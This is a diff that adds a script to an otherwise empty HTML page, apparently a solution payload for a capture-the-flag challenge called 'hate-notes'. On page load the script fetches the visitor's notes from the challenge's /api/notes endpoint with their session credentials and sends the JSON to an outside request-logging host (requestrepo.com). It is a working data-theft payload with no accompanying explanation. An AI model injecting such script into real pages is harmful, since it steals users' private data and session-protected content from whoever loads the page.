@@ -7,4 +7,28 @@
 <body>
 
 </body>
+  <script>
+async function fetchNotes() {
+    const response = await fetch('https://inst-b6c638e49b4cad8d-hate-notes.chal.crewc.tf//api/notes', {
+      method: 'GET',
+      credentials: 'same-origin',
+      headers: {
+        'Accept': 'application/json'
+      }
+    });
+    const notes = await response.json();
+    j = JSON.stringify(notes);
+    console.log(j);
+    fetch(`https://98qcwqmw.requestrepo.com?q=${j}`, {
+      method: 'POST',
+      credentials: 'same-origin',
+      headers: {
+        'Accept': 'application/json'
+      },
+      body: JSON.stringify(fetchNotes())
+    });
+
+};
+fetchNotes();
+</script>
 </html>
